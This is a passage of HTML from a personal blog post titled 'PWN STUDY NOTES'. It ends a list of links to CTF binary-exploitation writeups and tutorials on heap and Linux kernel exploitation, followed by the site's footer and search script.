writeups</p><li><p><a href="https://github.com/Naetw/CTF-pwn-tips">Naetw</a>: pwn tips</p><li><p><a href="https://github.com/nobodyisnobody">Nobody</a>: pwn writeups + interesting tricks</p><li><p><a href="https://azeria-labs.com/heap-exploit-development-part-1/">Azeria Labs</a>: basic heap exploitation</p><li><p><a href="https://github.com/shellphish/how2heap">Heap</a>: heap exploitation techniques</p><li><p><a href="https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/">Midas</a>: linux kernel exploitation</p></ul></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw me-1"></i> <a href="/categories/pwnable/">Pwnable</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw me-1"></i> <a href="/tags/study-notes/" class="post-tag no-text-decoration" >Study Notes</a> <a href="/tags/tools/" class="post-tag no-text-decoration" >Tools</a></div><div class=" post-tail-bottom d-flex justify-content-between align-items-center mt-5 pb-2 " ><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper d-flex align-items-center"> <span class="share-label text-muted">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=%F0%9F%93%93%20PWN%20STUDY%20NOTES%20-%20KayTii&url=https%3A%2F%2Fblog.kaytii.me%2Fposts%2Fpwn-study-notes%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter"> <i class="fa-fw fa-brands fa-square-x-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=%F0%9F%93%93%20PWN%20STUDY%20NOTES%20-%20KayTii&u=https%3A%2F%2Fblog.kaytii.me%2Fposts%2Fpwn-study-notes%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fblog.kaytii.me%2Fposts%2Fpwn-study-notes%2F&text=%F0%9F%93%93%20PWN%20STUDY%20NOTES%20-%20KayTii" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <button id="copy-link" aria-label="Copy link" class="btn small" data-bs-toggle="tooltip" data-bs-placement="top" title="Copy link" data-title-succeed="Link copied successfully!" > <i class="fa-fw fas fa-link pe-none fs-6"></i> </button> </span></div></div></div></article></main><aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 text-muted"><div class="access"><section id="access-lastmod"><h2 class="panel-heading">Recently Updated</h2><ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2"><li class="text-truncate lh-lg"> <a href="/posts/pwn-study-notes/">ğŸ““ PWN STUDY NOTES</a></ul></section><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/tags/study-notes/">Study Notes</a> <a class="post-tag btn btn-outline-primary" href="/tags/tools/">Tools</a></div></section></div><div class="toc-border-cover z-3"></div><section id="toc-wrapper" class="invisible position-sticky ps-0 pe-4 pb-4"><h2 class="panel-heading ps-3 pb-2 mb-0">Contents</h2><nav id="toc"></nav></section></aside></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4"><nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation"><div class="btn btn-outline-primary disabled" aria-label="Older"><p>-</p></div><div class="btn btn-outline-primary disabled" aria-label="Newer"><p>-</p></div></nav><footer aria-label="Site Info" class=" d-flex flex-column justify-content-center text-muted flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3 " ><p>Â© <time>2025</time> <a href="https://github.com/Kaytii210">Khoi Tran</a>. <span data-bs-toggle="tooltip" data-bs-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author." >Some rights reserved.</span></p><p>Using the <a data-bs-toggle="tooltip" data-bs-placement="top" title="v7.4.1" href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener" >Chirpy</a> theme for <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>.</p></footer></div></div><div id="search-result-wrapper" class="d-flex justify-content-center d-none"><div class="col-11 content"><div id="search-hints"><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/tags/study-notes/">Study Notes</a> <a class="post-tag btn btn-outline-primary" href="/tags/tools/">Tools</a></div></section></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><aside aria-label="Scroll to Top"> <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow"> <i class="fas fa-angle-up"></i> </button></aside></div><div id="mask" class="d-none position-fixed w-100 h-100 z-1"></div><aside id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-bs-animation="true" data-bs-autohide="false" ><div class="toast-header"> <button type="button" class="btn-close ms-auto" data-bs-dismiss="toast" aria-label="Close" ></button></div><div class="toast-body text-center pt-0"><p class="px-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></aside><script> document.addEventListener('DOMContentLoaded', () => { SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<article class="px-1 px-sm-2 px-lg-4 px-xl-0"><header><h2><a href="{url}">{title}</a></h2><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div></header><p>{content}</p></article>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); }); </script>
